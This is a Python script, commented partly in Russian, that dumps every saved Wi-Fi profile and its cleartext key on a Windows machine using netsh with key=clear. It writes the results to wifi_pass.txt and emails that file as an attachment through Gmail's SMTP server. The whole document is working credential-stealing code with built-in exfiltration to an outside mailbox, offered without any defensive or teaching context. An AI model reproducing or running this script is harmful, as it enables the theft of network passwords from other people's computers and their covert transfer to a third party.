import subprocess

#ext_wifipasswd = extract wifi password, dataprof = profile data
def ext_wifipasswd():
    dataprof = subprocess.check_output('netsh wlan show profiles').decode('utf-8').split('\n')

    profiles = [i.split(':')[1].strip() for i in dataprof if 'All User Profile' in i]
#info_prof = profile info
    for profile in profiles:
        info_prof = subprocess.check_output(f'netsh wlan show profile {profile} key=clear').decode('utf-8').split( '\n')

        try:
            passwd = [i.split(':')[1].strip() for i in info_prof if 'Key Content' in i][0]
        except IndexError:
            passwd = None

        # save file to storage
        with open(file='wifi_pass.txt', mode='a', encoding='utf-8') as file:
            file.write(f'Profile: {profile}\nPassword: {passwd}\n{"#" * 20}\n')


ext_wifipasswd()

#send file "wifi_pass.txt" to email address
import smtplib
import os

import mimetypes
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.audio import MIMEAudio
from email.mime.multipart import MIMEMultipart


def send_email(addr_to, msg_subj, msg_text, files):
    addr_from = "Type your email here"   #sender email address
    password  = "password"               #password

    msg = MIMEMultipart()
    msg['From']    = addr_from
    msg['To']      = addr_to
    msg['Subject'] = msg_subj

    body = msg_text
    msg.attach(MIMEText(body, 'plain'))

    process_attachement(msg, files)

    #========configure smtp access to email===============================================
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)    #Yours email ip and port. For example: ('smtp.gmail.com', 465)
    #server.starttls(587)                               #Secure connection with tls (optional)
    #server.set_debuglevel(True)                        #optional
    server.login(addr_from, password)
    server.send_message(msg)
    server.quit()
    #==========================================================================================================================

def process_attachement(msg, files):                        # Функция по обработке списка, добавляемых к сообщению файлов
    for f in files:
        if os.path.isfile(f):                               # Если файл существует
            attach_file(msg,f)                              # Добавляем файл к сообщению
        elif os.path.exists(f):                             # Если путь не файл и существует, значит - папка
            dir = os.listdir(f)                             # Получаем список файлов в папке
            for file in dir:                                # Перебираем все файлы и...
                attach_file(msg,f+"/"+file)                 # ...добавляем каждый файл к сообщению

def attach_file(msg, filepath):                             # Функция по добавлению конкретного файла к сообщению
    filename = os.path.basename(filepath)                   # Получаем только имя файла
    ctype, encoding = mimetypes.guess_type(filepath)        # Определяем тип файла на основе его расширения
    if ctype is None or encoding is not None:               # Если тип файла не определяется
        ctype = 'application/octet-stream'                  # Будем использовать общий тип
    maintype, subtype = ctype.split('/', 1)                 # Получаем тип и подтип
    if maintype == 'text':                                  # Если текстовый файл
        with open(filepath) as fp:                          # Открываем файл для чтения
            file = MIMEText(fp.read(), _subtype=subtype)    # Используем тип MIMEText
            fp.close()                                      # После использования файл обязательно нужно закрыть
    elif maintype == 'image':                               # Если изображение
        with open(filepath, 'rb') as fp:
            file = MIMEImage(fp.read(), _subtype=subtype)
            fp.close()
    elif maintype == 'audio':                               # Если аудио
        with open(filepath, 'rb') as fp:
            file = MIMEAudio(fp.read(), _subtype=subtype)
            fp.close()
    else:                                                   # Неизвестный тип файла
        with open(filepath, 'rb') as fp:
            file = MIMEBase(maintype, subtype)              # Используем общий MIME-тип
            file.set_payload(fp.read())                     # Добавляем содержимое общего типа (полезную нагрузку)
            fp.close()
            encoders.encode_base64(file)                    # Содержимое должно кодироваться как Base64
    file.add_header('Content-Disposition', 'attachment', filename=filename) # Добавляем заголовки
    msg.attach(file)                                        # Присоединяем файл к сообщению



# Использование функции send_email()
emailadress = input("Write yours email address for sending file: ")
addr_to   = emailadress                                              # You can choose one of two variants for send message
#addr_to = 'Your email'
files = ["wifi_pass.txt"]                                    # Список файлов, если вложений нет, то files=[]                                       # Если нужно отправить все файлы из заданной папки, нужно указать её

send_email(addr_to, "Title", "Your text", files)